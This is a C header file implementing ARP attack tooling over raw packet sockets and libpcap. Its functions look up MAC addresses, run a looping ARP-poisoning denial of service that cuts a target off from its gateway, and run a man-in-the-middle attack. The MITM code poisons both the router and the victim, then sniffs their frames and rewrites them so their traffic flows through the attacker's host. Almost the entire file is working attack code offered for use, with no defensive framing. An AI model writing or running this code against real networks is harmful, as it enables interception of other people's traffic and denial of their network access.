#ifndef __ARP_H__
#define __ARP_H__

// Matthew Todd Geiger
// Basic ARP

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <asm/types.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <malloc.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>

#include <features.h>
#include <errno.h>
#include <sys/types.h>
#include <stdint.h>
#include <rpc/types.h>

#define __USE_MISC 1

#include <sys/stat.h>
#include <netinet/in.h>
#include <linux/if_addr.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
//#include <net/if.h>
#include <net/ethernet.h>
#include <getopt.h>
#include <time.h>

#include <pcap.h>
#include <netdb.h>
#include <ifaddrs.h>

struct dos_thread_data {
    char spoof_mac[6];
    char router_mac[6];
    const char *interface;
    const char *target_ip;
    const char *router_ip;
    int delay;
    int spoof;
};

struct poison_thread_data {
    int sockfd;
    int delay;
    char packet_out_router[64];
    char packet_out_target[64];
    struct sockaddr_ll sll;
};

struct redirection_thread_data {
    char target_mac[6];
    char router_mac[6];
    char if_mac[6];
    char interface[10];
    uint32_t router_ip;
    uint32_t target_ip;
};

struct redirection_thread_data rdata;
struct poison_thread_data pdata;
struct dos_thread_data tdata;

#define HW_TYPE 1        // ARP Code for ethernet type hardware
#define MAC_LENGTH 6     // MAC address length in bytes
#define IPV4_LENGTH 4    // IP address length in bytes
#define ARP_REQUEST 0x01 // ARP request opcode

#define debug(x...) \
    printf(x);      \
    printf("\n");
#define info(x...) \
    printf(x);     \
    printf("\n");
#define warn(x...) \
    printf(x);     \
    printf("\n");
#define err(x...) \
    perror(x);    \
    fprintf(stderr, "\n");

// ARP protocol structure
struct arp_header
{
    unsigned short hardware_type; // ethernet, radio, etc..
    unsigned short protocol_type; // ip..
    unsigned char hardware_len;   // MAC length
    unsigned char protocol_len;   // ip length
    unsigned short opcode;        // ARP opcode can be a reply or request ARP packet
    unsigned char sender_mac[MAC_LENGTH];
    unsigned char sender_ip[IPV4_LENGTH];
    unsigned char target_mac[MAC_LENGTH];
    unsigned char target_ip[IPV4_LENGTH];
};

int get_if_ipv4(const char *ifname, int *ifindex, char *mac, uint32_t *ip, int sockfd)
{
    int ret = -1;

    // Create variable for interface mac and index number
    char *if_mac = mac;
    int if_index;
    struct ifreq ifr;

    // Copy argument in ifr for ioctl request
    strcpy(ifr.ifr_name, ifname);

    // Request socket for index number of interface name argument
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1)
    {
        err("Failed to get interface index value");
        goto out;
    }

    // Save index number
    if_index = ifr.ifr_ifindex;

    // Request socket for mac address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1)
    {
        err("Failed to get interface MAC address");
        goto out;
    }

    // Save mac address
    memcpy(if_mac, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

    // Request socket for ipv4 address
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1)
    {
        err("Failed to get ip address");
        goto out;
    }

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    struct sockaddr_in *sin_ptr;
    sin_ptr = (struct sockaddr_in *)&ifr.ifr_addr; // Point to ipv4 address value
    *ip = sin_ptr->sin_addr.s_addr;

    *ifindex = if_index;

    ret = 0;
out:
    return ret;
}

int bind_af_packet(int sockfd, int if_index, struct sockaddr_ll *sll)
{
    int ret = -1;

    memset(sll, 0, sizeof(struct sockaddr_ll)); // Set to 0
    sll->sll_family = AF_PACKET;                // AF_PACKET socket type
    sll->sll_ifindex = if_index;                // Index number

    // Bind socket info with sll info
    if (bind(sockfd, (struct sockaddr *)sll, sizeof(*sll)) < 0)
    {
        err("Failed to bind socket information");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

void create_arp_req_packet(char *packet_out, char *if_mac, uint32_t target_ip, uint32_t ip, struct sockaddr_ll *sll)
{
    // Create header pointers for output packet
    struct ethhdr *eth = (struct ethhdr *)packet_out;
    struct arp_header *arp = (struct arp_header *)(packet_out + sizeof(struct ethhdr));

    // Set ethernet header parameters
    memset(eth->h_dest, 0xff, MAC_LENGTH);     // Destination mac set to all 0xff, all 0xff mac will broadcast to all machines
    memcpy(eth->h_source, if_mac, MAC_LENGTH); // Source mac from interface
    eth->h_proto = htons(ETH_P_ARP);           // Follow arp protocol

    // Set ARP header parameters
    arp->hardware_len = MAC_LENGTH;                  // Assign MAC length
    arp->hardware_type = htons(HW_TYPE);             // Hardware type of 1. value 1 is ethernet hardware type
    arp->opcode = htons(ARP_REQUEST);                // Assign opcode arp request
    arp->protocol_len = IPV4_LENGTH;                 // Assign IPv4 length
    arp->protocol_type = htons(ETH_P_IP);            // Set protocol type to IP
    memcpy(arp->sender_ip, &ip, IPV4_LENGTH);        // Apply your IP address
    memcpy(arp->sender_mac, if_mac, MAC_LENGTH);     // Apply your MAC address
    memset(arp->target_mac, 0xff, MAC_LENGTH);       // Destination mac set to all 0xff for broadcast
    memcpy(arp->target_ip, &target_ip, IPV4_LENGTH); // Copy ip address

    // Reuse sll for sockaddr info for sendto() function
    memcpy(&sll->sll_addr, if_mac, MAC_LENGTH);
    sll->sll_halen = MAC_LENGTH;           // Set mac length
    sll->sll_hatype = htons(ARPHRD_ETHER); // Define ethernet hardware type
    sll->sll_pkttype = (PACKET_BROADCAST); // Broadcast packet
    sll->sll_protocol = htons(ETH_P_ARP);  // ARP protocol
}

void create_arp_rep_packet(char *packet_out, char *src_mac, char *dst_mac, uint32_t target_ip, uint32_t src_ip, struct sockaddr_ll *sll)
{
    // Create header pointers for output packet
    struct ethhdr *eth = (struct ethhdr *)packet_out;
    struct arp_header *arp = (struct arp_header *)(packet_out + sizeof(struct ethhdr));

    // Set ethernet header parameters
    memcpy(eth->h_dest, dst_mac, MAC_LENGTH);     // Destination mac set to all 0xff, all 0xff mac will broadcast to all machines
    memcpy(eth->h_source, src_mac, MAC_LENGTH); // Source mac from interface
    eth->h_proto = htons(ETH_P_ARP);           // Follow arp protocol

    // Set ARP header parameters
    arp->hardware_len = MAC_LENGTH;                  // Assign MAC length
    arp->hardware_type = htons(HW_TYPE);             // Hardware type of 1. value 1 is ethernet hardware type
    arp->opcode = htons(ARP_REQUEST);                // Assign opcode arp request
    arp->protocol_len = IPV4_LENGTH;                 // Assign IPv4 length
    arp->protocol_type = htons(ETH_P_IP);            // Set protocol type to IP
    memcpy(arp->sender_ip, &src_ip, IPV4_LENGTH);        // Apply your IP address
    memcpy(arp->sender_mac, src_mac, MAC_LENGTH);     // Apply your MAC address
    memcpy(arp->target_mac, dst_mac, MAC_LENGTH);       // Destination mac set to all 0xff for broadcast
    memcpy(arp->target_ip, &target_ip, IPV4_LENGTH); // Copy ip address

    // Reuse sll for sockaddr info for sendto() function
    memcpy(&sll->sll_addr, src_mac, MAC_LENGTH);
    sll->sll_halen = MAC_LENGTH;           // Set mac length
    sll->sll_hatype = htons(ARPHRD_ETHER); // Define ethernet hardware type
    sll->sll_pkttype = (PACKET_BROADCAST); // Broadcast packet
    sll->sll_protocol = htons(ETH_P_ARP);  // ARP protocol
}

int send_packet(int sockfd, char *packet_out, struct sockaddr_ll sll, int len)
{
    int sent, tosend = len;

    // Use sendto() to send packet to network
    while (tosend > 0)
    {
        sent = sendto(sockfd, packet_out, tosend, 0, (struct sockaddr *)&sll, sizeof(sll));
        if (sent < 0)
        {
            err("Failed to send packet");
            return -1;
        }

        tosend = tosend - sent;
        packet_out = packet_out + sent;
    }
    return 0;
}

int recv_packet(int sockfd, char *packet_in, struct sockaddr_ll sll)
{
    // Recieve incoming ARP reply
    socklen_t len = sizeof(sll);
    if (recvfrom(sockfd, packet_in, 64, 0, (struct sockaddr *)&sll, &len) < 0)
    {
        err("Failed to recieve packet");
        return -1;
    }

    return 0;
}

int exec_arp_com(int sockfd, char *packet_in, char *packet_out, struct sockaddr_ll sll, int length)
{
    int ret = -1;
    // Use sendto() to send packet to network
    if (send_packet(sockfd, packet_out, sll, length) != 0)
    {
        err("Failed to send packet");
        goto out;
    }

    // Recieve incoming ARP reply
    socklen_t len = sizeof(sll);
    if (recv_packet(sockfd, packet_in, sll) != 0)
    {
        err("Failed to recieve packet");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

int exec_arp_com_nrep(int sockfd, char *packet_out, struct sockaddr_ll sll, int len)
{
    int ret = -1;
    // Use sendto() to send packet to network
    if (send_packet(sockfd, packet_out, sll, len) != 0)
    {
        err("Failed to send packet");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

char *display_mac(char *mac)
{
    char *__mac_t_temp = (char *)malloc(sizeof(char) * MAC_LENGTH);

    sprintf(__mac_t_temp, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0] & 0xff,
          mac[1] & 0xff,
          mac[2] & 0xff,
          mac[3] & 0xff,
          mac[4] & 0xff,
          mac[5] & 0xff);

    return __mac_t_temp;
}

void debug_arp(char *packet_in, char *if_mac, uint32_t ip, uint32_t target_ip)
{
    struct in_addr *in = (struct in_addr *)&ip;         // Use in_addr struct for use in inet_ntoa function
    struct in_addr *in2 = (struct in_addr *)&target_ip; // Use in_addr struct for use in inet_ntoa function

    // Reuse header pointers to discect recieved packet
    struct arp_header *arp = (struct arp_header *)(packet_in + sizeof(struct ethhdr));

    debug("ARP Communication successful!");

    debug("Interface Information");
    debug("Interface MAC: %s", display_mac(if_mac));

    debug("Interface IP: %s", inet_ntoa(*in));

    // Display recieved MAC address
    debug("Target Information");
    debug("Target MAC: %s", display_mac((char *)arp->sender_mac));

    debug("Target IP: %s", inet_ntoa(*in2));
}

int create_af_sock(int proto)
{
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(proto));
    if (sockfd < 0)
    {
        err("Failed to open socket");
    }

    return sockfd;
}

void arp_rep_mac(char *return_mac, char *packet_in)
{
    struct arp_header *arp = (struct arp_header *)(packet_in + sizeof(struct ethhdr));
    memcpy(return_mac, arp->sender_mac, MAC_LENGTH);
}

int find_mac_ipv4(char *return_mac, const char *interface, const char *target_ip)
{
    int ret = -1;

    // Translate target ip to raw data
    uint32_t ip_temp = inet_addr(target_ip);

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    uint32_t ip;

    // Create packet recieved and delivered buffers
    char packet_out[64];
    char packet_in[64];

    // Create variable for interface mac and index number
    char if_mac[8];
    int if_index;

    // Create raw socket for arp
    int sockfd = create_af_sock(ETH_P_ARP);
    if (sockfd < 0)
    {
        err("Failed to create af socket");
        goto out;
    }

    if (get_if_ipv4(interface, &if_index, if_mac, &ip, sockfd) != 0)
    {
        err("Failed to get hardware information\n");
        goto out;
    }

    struct sockaddr_ll sll;
    if (bind_af_packet(sockfd, if_index, &sll) != 0)
    {
        err("Failed to bind socket information\n");
        goto out;
    }

    create_arp_req_packet(packet_out, if_mac, ip_temp, ip, &sll);

    if (exec_arp_com(sockfd, packet_in, packet_out, sll, (sizeof(struct ethhdr) + sizeof(struct arp_header))) != 0)
    {
        err("Failed to transcieve arp over the network\n");
        goto out;
    }

    arp_rep_mac(return_mac, packet_in);

    debug_arp(packet_in, if_mac, ip, ip_temp);

    ret = 0;

    // Clean up
out:
    if (sockfd > -1)
        close(sockfd);

    return ret;
}

int dos_local_target(char *spoof_mac, char *router_mac, const char *interface, const char *target_ip, const char *router_ip, int delay, int spoof) {
    int ret = -1;

    // Translate target ip to raw data
    uint32_t router_ip_temp = inet_addr(router_ip);
    uint32_t target_ip_temp = inet_addr(target_ip);

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    uint32_t ip;

    // Create packet recieved and delivered buffers
    char packet_out[64];

    // Create variable for interface mac and index number
    char if_mac[8];
    int if_index;

    // Create raw socket for arp
    int sockfd = create_af_sock(ETH_P_ARP);
    if (sockfd < 0)
    {
        err("Failed to create af socket");
        goto out;
    }

    // Get interface info
    if (get_if_ipv4(interface, &if_index, if_mac, &ip, sockfd) != 0)
    {
        err("Failed to get hardware information\n");
        goto out;
    }

    // Create sock info struct and bind with AF_PACKET
    struct sockaddr_ll sll;
    if (bind_af_packet(sockfd, if_index, &sll) != 0)
    {
        err("Failed to bind socket information\n");
        goto out;
    }

    // Create packets depending on spoof flag
    if(spoof == 1)
        create_arp_rep_packet(packet_out, spoof_mac, router_mac, router_ip_temp, target_ip_temp, &sll);
    else
        create_arp_rep_packet(packet_out, if_mac, router_mac, router_ip_temp, target_ip_temp, &sll);

    // Start poisoning(By ARP poisoning in a given delay, the target will not be able to communicate with the gateway)
    while(1) {
        if (exec_arp_com_nrep(sockfd, packet_out, sll, (sizeof(struct ethhdr) + sizeof(struct arp_header))) != 0)
        {
            err("Failed to transcieve arp over the network\n");
            goto out;
        }

        debug("Packet Sent");

        sleep(delay);
    }

    ret = 0;

    // Clean up
out:
    if (sockfd > -1)
        close(sockfd);

    return ret;
}

void *arp_poison_thread(void *thread_data) {
    int ret = -1;

    debug("Attempting to run thread");

    struct poison_thread_data *data = (struct poison_thread_data *)thread_data;

    while (1)
    {
        if (exec_arp_com_nrep(data->sockfd, data->packet_out_router, data->sll, (sizeof(struct ethhdr) + sizeof(struct arp_header))) != 0)
        {
            err("Failed to transcieve arp over the network\n");
            goto out;
        }

        if (exec_arp_com_nrep(data->sockfd, data->packet_out_target, data->sll, (sizeof(struct ethhdr) + sizeof(struct arp_header))) != 0)
        {
            err("Failed to transcieve arp over the network\n");
            goto out;
        }

        debug("ARP Poison Packets sent");

        sleep(data->delay);
    }

    ret = 0;

out:
    pthread_exit(&ret);
}

void init_sll(char *mac, uint16_t proto, struct sockaddr_ll *sll) {
    memcpy(&sll->sll_addr, mac, MAC_LENGTH);
    sll->sll_halen = MAC_LENGTH;           // Set mac length
    sll->sll_hatype = htons(ARPHRD_ETHER); // Define ethernet hardware type
    sll->sll_pkttype = (PACKET_BROADCAST); // Broadcast packet
    sll->sll_protocol = htons(proto);  // ARP protocol
}

// launch a thread that looks for either the targets mac address to be in the destination or src of the eth header
// If comparison is successful change the mac and send out onto network
void *redirction_thread(void *args) {
    int ret = -1;

    // Create eth pointer for parsing and rewriting
    struct redirection_thread_data *data = (struct redirection_thread_data *)args;
     // Create pcap header
    struct pcap_pkthdr header;

    // Create packet info ptr -- unsigned values are very common w/ sockets --
    const u_char *packet;

    // Create buffer for err msg
    char errbuf[PCAP_ERRBUF_SIZE];

    // Create device ptr
    //char *device;

    // Create pcap handle ptr
    pcap_t *pcapHandle;

    printf("Sniffing on %s\n", data->interface);
    sleep(1);

    // Create handle on device
    pcapHandle = pcap_open_live(data->interface, 4096, 1, 0, errbuf);
    if(pcapHandle == NULL){
        err("Failed to open device");
        goto out;
    }

    // Create struct for parsing
    struct ethhdr *eth = NULL;
    struct iphdr *iph;

    // Variable to hold length of recieved packet
    int len = 0;

    // Create variable to hold interface info
    int if_index = 0;
    uint32_t ip = 0;

    // Packet buffer
    char packet_in[4096];

    // Create raw socket open to all packets
    int sockfd = create_af_sock(ETH_P_IP);
    if (sockfd < 0)
    {
        err("Failed to create af socket");
        goto out;
    }

    // Get interface information
    if (get_if_ipv4(data->interface, &if_index, data->if_mac, &ip, sockfd) != 0)
    {
        err("Failed to get hardware information\n");
        goto out;
    }

    // Bind socket with AF_PACKET
    struct sockaddr_ll sll;
    if (bind_af_packet(sockfd, if_index, &sll) != 0)
    {
        err("Failed to bind socket information\n");
        goto out;
    }

    // Create sll info
    init_sll(data->if_mac, ETH_P_IP, &sll);
    uint16_t arp = htons(ETH_P_ARP);

    eth = (struct ethhdr *)packet_in;
    iph = (struct iphdr *)(packet_in + sizeof(struct ethhdr));

    while(1) {
        // Select packet
        packet = pcap_next(pcapHandle, &header);    // Assign char * to current TCP buffer
        
        if(packet == NULL) goto out;
        
        memcpy(packet_in, packet, header.len);

        // Check the src ip
        // If source ip is target/router
        if (memcmp(eth->h_source, data->target_mac, MAC_LENGTH) == 0 /*&& memcmp(&eth->h_proto, &arp, 2) != 0*/)
        {
            if(memcmp(eth->h_dest, data->if_mac, MAC_LENGTH) == 0) {
                memcpy(eth->h_dest, data->router_mac, MAC_LENGTH);
            }

            memcpy(eth->h_source, data->if_mac, MAC_LENGTH);
            send_packet(sockfd, packet_in, sll, header.len);
        } else if(memcmp(eth->h_source, data->router_mac, MAC_LENGTH) == 0) {
            if(memcmp(eth->h_dest, data->if_mac, MAC_LENGTH) == 0) {
                memcpy(eth->h_dest, data->target_mac, MAC_LENGTH);
            }
            memcpy(eth->h_source, data->if_mac, MAC_LENGTH);
            send_packet(sockfd, packet_in, sll, header.len);
        }
    }

    ret = 0;

out:
    if(sockfd > 0)
        close(sockfd);

    pthread_exit(&ret);
}

// Initializes MITM thread and launches
void launch_redirction_thread(char *router_mac, char *target_mac, const char *interface, uint32_t target_ip, uint32_t router_ip) {
    memset(&rdata, 0, sizeof(struct redirection_thread_data));
    strcpy(rdata.interface, interface);
    memcpy(rdata.target_mac, target_mac, MAC_LENGTH);
    memcpy(rdata.router_mac, router_mac, MAC_LENGTH);

    rdata.target_ip = target_ip;
    rdata.router_ip = router_ip;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);

    pthread_create(&tid, &attr, redirction_thread, &rdata);

    pthread_join(tid, NULL);
}

int mitm_local_target(char *router_mac, char *target_mac, const char *interface, const char *target_ip, const char *router_ip) {
    int ret = -1;

    // Translate target ip to raw data
    uint32_t router_ip_temp = inet_addr(router_ip);
    uint32_t target_ip_temp = inet_addr(target_ip);

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    uint32_t ip;

    // Create packet recieved and delivered buffers
    char packet_out[64];

    // Create variable for interface mac and index number
    char if_mac[8];
    int if_index;

    pthread_t tid;
    pthread_attr_t attr;



    // Create raw socket for arp
    int sockfd = create_af_sock(ETH_P_ARP);
    if (sockfd < 0)
    {
        err("Failed to create af socket");
        goto out;
    }


    if (get_if_ipv4(interface, &if_index, if_mac, &ip, sockfd) != 0)
    {
        err("Failed to get hardware information\n");
        goto out;
    }

    struct sockaddr_ll sll;
    if (bind_af_packet(sockfd, if_index, &sll) != 0)
    {
        err("Failed to bind socket information\n");
        goto out;
    }

    // Create packets for poisoning
    create_arp_rep_packet(packet_out, if_mac, router_mac, router_ip_temp, target_ip_temp, &sll);
    memcpy(pdata.packet_out_router, packet_out, 64);

    create_arp_rep_packet(packet_out, if_mac, target_mac, target_ip_temp, router_ip_temp, &sll);
    memcpy(pdata.packet_out_target, packet_out, 64);

    // Set thread info
    pdata.delay = 1;
    pdata.sockfd = sockfd;
    memcpy(&pdata.sll, &sll, sizeof(sll));

    pthread_attr_init(&attr);

    // Create poison thread
    pthread_create(&tid, &attr, arp_poison_thread, &pdata);

    // Start mitm thread init
    launch_redirction_thread(router_mac, target_mac, interface, target_ip_temp, router_ip_temp);

    while(1) { 
            // END OF DAY 1: 2019-03-04 @ 08:06
    }

    debug("Poison packets sent");
    sleep(1);

    ret = 0;

out:
    return ret;
}

// Main DOS thread
void *dos_thread(void *thread_data) {
    int ret = -1;

    debug("Attempting to run thread");

    // Assign argument data type
    struct dos_thread_data *data = (struct dos_thread_data *)thread_data;

    // Run main function
    if(dos_local_target(data->spoof_mac, data->router_mac, data->interface,
    data->target_ip, data->router_ip, data->delay, data->spoof) != 0) {
        err("Failed to dos target");
        goto out;
    }

    ret = 0;

out:
    pthread_exit(&ret);
}

//
// ARP MAIN SECTION //
//

int run_local_dos_attack(const char *interface, const char *target_ip, const char *router_ip, const char *spoof_ip, int spoof, int delay, pthread_t *tid) {
    int ret = -1;

    // Create thread attr
    pthread_attr_t attr;
    pthread_attr_init(&attr);

    char target_mac[MAC_LENGTH];
    char router_mac[MAC_LENGTH];
    char spoof_mac[MAC_LENGTH];

    // Find macs of router and target(Optionally a spoof target also)
    if (find_mac_ipv4(target_mac, interface, target_ip) != 0)
    {
        err("Failed to find target mac address");
        goto out;
    }

    if (find_mac_ipv4(router_mac, interface, router_ip) != 0)
    {
        err("Failed to find target mac address");
        goto out;
    }

    if(spoof == 1) {
        if (find_mac_ipv4(spoof_mac, interface, spoof_ip) != 0)
        {
            err("Failed to find target mac address");
            goto out;
        }

        memcpy(tdata.spoof_mac, spoof_mac, MAC_LENGTH);
    }

    // Init thread data
    tdata.delay = delay;
    tdata.spoof = spoof;
    tdata.interface = interface;
    tdata.router_ip = router_ip;
    tdata.target_ip = target_ip;

    memcpy(tdata.router_mac, router_mac, MAC_LENGTH);

    // Launch thread
    pthread_create(tid, &attr, dos_thread, &tdata);

    ret = 0;

out:
    return ret;
}

int run_mitm_attack(const char *interface, const char *target_ip, const char *router_ip) {
    nice(-20);

    int ret = -1;

    char target_mac[MAC_LENGTH];
    char router_mac[MAC_LENGTH];

    // Find mac of router and target
    if (find_mac_ipv4(target_mac, interface, target_ip) != 0)
    {
        err("Failed to find target mac address");
        goto out;
    }

    if (find_mac_ipv4(router_mac, interface, router_ip) != 0)
    {
        err("Failed to find target mac address");
        goto out;
    }

    // Launch attack
    if(mitm_local_target(router_mac, target_mac, interface, target_ip, router_ip) != 0) {
        err("Failed to launch mitm attack");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

#endif